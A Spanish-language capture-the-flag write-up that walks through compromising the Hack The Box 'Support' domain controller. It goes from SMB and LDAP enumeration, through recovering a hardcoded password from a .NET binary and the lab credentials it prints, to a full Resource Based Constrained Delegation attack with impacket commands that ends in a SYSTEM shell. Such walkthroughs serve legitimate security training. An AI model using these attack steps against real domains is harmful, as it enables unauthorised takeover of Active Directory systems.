---
title: Support
description: Support es una máquina Windows de dificultad fácil que presenta un recurso compartido SMB con autenticación anónima habilitada. Tras conectarse al recurso, se descubre un archivo ejecutable que se utiliza para consultar el servidor LDAP de la máquina en busca de usuarios disponibles. Mediante reverse engineering, análisis de red o emulación, se identifica la contraseña que el binario utiliza para hacer bind al servidor LDAP, lo que permite realizar consultas adicionales. En la lista de usuarios se identifica un usuario llamado support, y en el campo info se encuentra su contraseña, lo que permite establecer una conexión WinRM con la máquina. Una vez dentro, se puede recolectar información del dominio usando SharpHound, y BloodHound revela que el grupo Shared Support Accounts, al que pertenece el usuario support, tiene privilegios GenericAll sobre el Domain Controller. Se lleva a cabo un ataque de Resource Based Constrained Delegation, y se obtiene una shell como NT AUTHORITY\SYSTEM.
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-support/support_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - windows
  - hack_the_box
  - tcp
  - dns
  - smb
  - kerberos
  - ldap
  - winrm
  - misconfigurations
  - debugging
  - resource_based_constrained_delegation
  - tgs
  - information_gathering
  - vulnerability_exploitation
  - active_directory_enumeration
  - active_directory_exploitation
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/support:-$ ping -c 1 10.10.11.174
PING 10.10.11.174 (10.10.11.174) 56(84) bytes of data.
64 bytes from 10.10.11.174: icmp_seq=1 ttl=127 time=174 ms

--- 10.10.11.174 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 174.421/174.421/174.421/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/support:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.174 -n -Pn -oG nmap1
Host: 10.10.11.174 ()	Status: Up
Host: 10.10.11.174 ()	Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 49664/open/tcp/////, 49667/open/tcp/////, 49674/open/tcp/////, 49686/open/tcp/////, 49691/open/tcp/////, 49712/open/tcp/////	Ignored State: filtered (65516)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/support:-$ sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49674,49686,49691,49712 -vvv -oN nmap2 10.10.11.174
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-05 22:50:22Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49712/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-05T22:51:17
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 19493/tcp): CLEAN (Timeout)
|   Check 2 (port 49048/tcp): CLEAN (Timeout)
|   Check 3 (port 45724/udp): CLEAN (Timeout)
|   Check 4 (port 56910/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

Identifico que me encuentro frente a un Domain Controller a través de crackmapexec. La herramienta me muestra que el nombre del host es `DC`, el sistema operativo es `Windows Server 2022`, y el dominio al que pertenece es `support.htb`.

```terminal
/home/kali/Documents/htb/machines/support:-$ crackmapexec smb 10.10.11.174
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
```

Agrego los nombres relevantes al archivo `/etc/hosts`.

```terminal
/home/kali/Documents/htb/machines/support:-$ echo '10.10.11.174\tdc\tsupport.htb\tdc.support.htb' | sudo tee -a /etc/hosts
```

---
## Active Directory Enumeration

Enumero los recursos compartidos del servidor, donde confirmo que tengo permisos `READ ONLY` en los recursos `IPC$` y `support-tools`.

```terminal
/home/kali/Documents/htb/machines/support:-$ smbmap -H 10.10.11.174 -u guest
```

![](assets/img/htb-writeup-support/support1_2.png)

Accedo al recurso compartido `support-tools` y verifico su contenido.

```terminal
/home/kali/Documents/htb/machines/support:-$ smbclient \\\\10.10.11.174\\support-tools
smb: \> dir
```

![](assets/img/htb-writeup-support/support1_3.png)

Este recurso contiene varias herramientas públicas, salvo una que llama la atención, `UserInfo.exe`. Asi que descargo el archivo para analizarlo en local.

```terminal
smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (42.9 KiloBytes/sec) (average 42.9 KiloBytes/sec)
```

---
## Vulnerability Exploitation

El archivo comprimido contiene un ejecutable `.exe` junto con varias bibliotecas `.dll` necesarias para su ejecución.

```terminal
/home/kali/Documents/htb/machines/support/content:-$ unzip UserInfo.exe.zip
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe
  inflating: CommandLineParser.dll
  inflating: Microsoft.Bcl.AsyncInterfaces.dll
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll
  inflating: Microsoft.Extensions.DependencyInjection.dll
  inflating: Microsoft.Extensions.Logging.Abstractions.dll
  inflating: System.Buffers.dll
  inflating: System.Memory.dll
  inflating: System.Numerics.Vectors.dll
  inflating: System.Runtime.CompilerServices.Unsafe.dll
  inflating: System.Threading.Tasks.Extensions.dll
  inflating: UserInfo.exe.config
```

Confirmo que se trata de un ejecutable `.NET` compilado para Windows de 32 bits.

```terminal
/home/kali/Documents/htb/machines/support/content:-$ file UserInfo.exe
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

Levanto un servidor para transferir el archivo a una máquina con Windows y poder analizarlo.

```terminal
/home/kali/Documents/htb:-$ python3 -m http.server
```

Desde Windows, abro una consola con privilegios de administrador, descargo el archivo comprimido y lo extraigo.

```powershell
C:\Users\litio7\Documents\htb\support> runas /user:Administrador "cmd.exe"

C:\Users\litio7\Documents\htb\> curl http://192.168.0.171:8000/support/content/UserInfo.exe.zip -o support/UserInfo.exe.zip
C:\Users\litio7\Documents\htb\support> 7z x UserInfo.exe.zip
```

La utilidad parece estar diseñada para mostrar información de usuarios en un entorno de dominio. Su interfaz por línea de comandos sugiere que puede consultar usuarios específicos o realizar búsquedas generales.

```powershell
C:\Users\litio7\Documents\htb\support> UserInfo.exe
```

![](assets/img/htb-writeup-support/support2_1.png)

Sin embargo, para que la herramienta funcione correctamente, necesita establecer una conexión con el servicio ldap de la máquina objetivo.

```powershell
C:\Users\litio7\Documents\htb\support> UserInfo.exe user -username support
[-] Exception: The server is not operational.
```

Descargo la vpn de htb y edito el archivo hosts para que el nombre de dominio sea reconocido localmente.

```powershell
C:\Users\litio7\Documents\htb> curl http://192.168.0.171:8000/vpn/lab_Litio7.ovpn -o vpn/lab_Litio7.ovpn

C:\Users\litio7\Documents\htb\support> echo 10.10.11.174 support.htb >> C:\Windows\System32\drivers\etc\hosts
```

Una vez conectada la vpn y resuelto el nombre de dominio, puedo utilizar la herramienta para enumerar usuarios válidos del dominio a través de ldap.

```powershell
C:\Users\litio7\Documents\htb\support\UserInfo> UserInfo.exe find
[-] At least one of -first or -last is required.

C:\Users\litio7\Documents\htb\support\UserInfo> UserInfo.exe find -first * -last *
```

![](assets/img/htb-writeup-support/support2_2.png)

---

Cuento con usuarios válidos pero no con credenciales, por lo que analizo el ejecutable utilizando dnSpy.

El punto de entrada más prometedor es la clase LdapQuery, que contiene dos funciones principales, `printUser` y `query`, probablemente asociadas con los comandos que permite ejecutar la herramienta. Sin embargo, el constructor es el fragmento más interesante.

![](assets/img/htb-writeup-support/support2_3.png)

El ejecutable se conecta directamente al servicio ldap utilizando el usuario `support\ldap` y una contraseña obtenida dinámicamente mediante la función `Protected.getPassword()`.

![](assets/img/htb-writeup-support/support2_4.png)

En el constructor de `LdapQuery`, la llamada a

```csharp
string password = Protected.getPassword();
this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```

obtiene la contraseña de un atributo cifrado. La función `getPassword()` hace lo siguiente:

* Decodifica la cadena Base64 almacenada en `Protected.enc_password`.
* Recorre cada byte del resultado y le aplica dos operaciones XOR, donde `Protected.key` es la secuencia ASCII de `armando`.

```csharp
array2[i] = array[i] ^ Protected.key[i % Protected.key.Length] ^ 223;
```

* Convierte el arreglo resultante de bytes a cadena con la codificación por defecto.

---

Para obtener la contraseña, utilizo las capacidades de debugging de dnSpy:

* Selecciono la línea:

```csharp
string password = Protected.getPassword();
```

* Habilito un breakpoint con `Debug` > `Toggle Breakpoint`.

* Inicio el debugging `Start Debugging` y paso los siguientes argumentos: `find -first * -last *`.

* Una vez detenido en el breakpoint, uso `Debug` > `Step Over` para ejecutar la función línea por línea.

Esto permite inspeccionar el valor real de la variable password directamente en el entorno de debugging.

{% include embed/video.html src='assets/img/htb-writeup-support/support2_5.webm' types='webm' title='Debugging exe file' autoplay=true loop=true muted=true %}

Una alternativa más directa para obtener la contraseña es replicar el algoritmo de desencriptado en Python.

```python
#!/usr/bin/env python3

import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
data = base64.b64decode(enc_password)
key = b"armando"

password = ''.join(
    chr(data[i] ^ key[i % len(key)] ^ 223)
    for i in range(len(data))
)

print(password)
```

Verifico la validez de la contraseña encontrada mediante crackmapexec, confirmando que las credenciales extraídas del binario son válidas.

```terminal
/home/kali/Documents/htb/machines/support:-$ crackmapexec smb 10.10.11.174 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

---
## Active Directory Exploitation

Realizo una búsqueda por ldap utilizando las credenciales previamente obtenidas.

```terminal
/home/kali/Documents/htb/machines/support:-$ ldapsearch -x -H ldap://10.10.11.174 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" > ldapinfo
```

![](assets/img/htb-writeup-support/support3_1.png)

En la entrada correspondiente al usuario `support`, dentro del campo `info`, se encuentra una cadena con el formato de una posible contraseña.

Verifico su validez como credencial a través del servicio WinRM.

```terminal
/home/kali/Documents/htb/machines/support:-$ crackmapexec winrm 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
SMB         10.10.11.174    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
HTTP        10.10.11.174    5985   DC               [*] http://10.10.11.174:5985/wsman
WINRM       10.10.11.174    5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```

Y siendo el resultado positivo, accedo a la máquina mediante evil-winrm.

```terminal
/home/kali/Documents/htb/machines/support:-$ evil-winrm -i 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'

*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support

*Evil-WinRM* PS C:\Users\support> type Desktop/user.txt
```

---
## Privilege Escalation

Utilizo bloodhound-python para recolectar información.

```terminal
/home/kali/Documents/htb/machines/support:-$ bloodhound-python -u support -p Ironside47pleasure40Watchful -ns 10.10.11.174 --zip -c All -d support.htb
```

![](assets/img/htb-writeup-support/support4_1.png)

Levanto la interfaz de BloodHound para analizar los resultados.

```terminal
/home/kali/Documents/tools/bloodhund:-$ curl -L https://ghst.ly/getbhce > docker-compose.yml
/home/kali/Documents/tools/bloodhund:-$ sudo docker compose pull && sudo docker compose up
```

A través del análisis en BloodHound, detecto que el usuario `support` es miembro del grupo `Shared Support Accounts`, el cual posee el permiso `GenericAll` sobre el objeto del equipo `DC.SUPPORT.HTB`.

![](assets/img/htb-writeup-support/support4_2.png)

Esto habilita la posibilidad de llevar a cabo un ataque de [Resource Based Constrained Delegation Attack](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html)

---

Descargo la herramienta [tothi-rbcd-attack](https://github.com/tothi/rbcd-attack), la cual permite configurar el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` para habilitar delegación basada en recursos.

```terminal
/home/kali/Documents/htb/machines/support:-$ wget https://raw.githubusercontent.com/tothi/rbcd-attack/refs/heads/master/rbcd.py /home/kali/Documents/tools/
```

Utilizo impacket-addcomputer para crear un objeto de tipo computadora `evilcomputer$` dentro del dominio `support.htb`. Este objeto actuará como entidad controlada por el atacante, desde la cual se ejecutará la delegación. Este equipo falso será el autorizado para suplantar identidades contra la máquina objetivo.

```terminal
/home/kali/Documents/htb/machines/support:-$ impacket-addcomputer -computer-name 'evilcomputer' -computer-pass ev1lP@sS -dc-ip 10.10.11.174 support.htb/support:Ironside47pleasure40Watchful
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account evilcomputer$ with password ev1lP@sS.
```

En este paso, se abusa del permiso `GenericAll` sobre el objeto de la máquina `DC`, lo cual permite modificar directamente el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity`. Este atributo define qué entidades pueden suplantar a cualquier usuario al autenticarse contra la máquina objetivo. Al asociar este atributo con `EVILCOMPUTER$`, se autoriza a dicho equipo a solicitar tickets de servicio S4U2Proxy en nombre de otros usuarios.

```terminal
(venv)-/home/kali/Documents/htb/machines/support:-$ /home/kali/Documents/tools/./rbcd.py -f EVILCOMPUTER -t dc -dc-ip 10.10.11.174 support.htb\\support:Ironside47pleasure40Watchful
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Starting Resource Based Constrained Delegation Attack against dc$
[*] Initializing LDAP connection to 10.10.11.174
[*] Using support.htb\support account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `EVILCOMPUTER` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `dc`
[*] Delegation rights modified succesfully!
[*] EVILCOMPUTER$ can now impersonate users on dc$ via S4U2Proxy
```

Solicito un TGT para que me permita impersonar al usuario `Administrator` frente al servicio CIFS de `dc.support.htb`.

```terminal
/home/kali/Documents/htb/machines/support:-$ impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/EVILCOMPUTER$:ev1lP@sS
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

El ticket generado es un `ccache`, que requiere ser exportarlo como variable de entorno para que herramientas compatibles con Kerberos puedan utilizarlo automáticamente durante el proceso de autenticación.

```terminal
/home/kali/Documents/htb/machines/support:-$ export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache

/home/kali/Documents/htb/machines/support:-$ klist
Ticket cache: FILE:Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
Default principal: Administrator@support.htb

Valid starting     Expires            Service principal
04/06/25 22:26:53  04/07/25 08:26:51  cifs/dc.support.htb@SUPPORT.HTB
        renew until 04/07/25 22:26:50
```

Con el ticket Kerberos válido, lanzo una shell remota como `Administrator` sin necesidad de proporcionar credenciales explícitas, logrando el control completo sobre el Domain Controller.

```terminal
/home/kali/Documents/htb/machines/support:-$ impacket-psexec -k -no-pass support.htb/Administrator@dc.support.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file pNOWcEcn.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service vgWm on dc.support.htb.....
[*] Starting service vgWm.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
```

> <a href="https://labs.hackthebox.com/achievement/machine/1521382/484" target="_blank">***Litio7 has successfully solved Support from Hack The Box***</a>
{: .prompt-info style="text-align:center" }
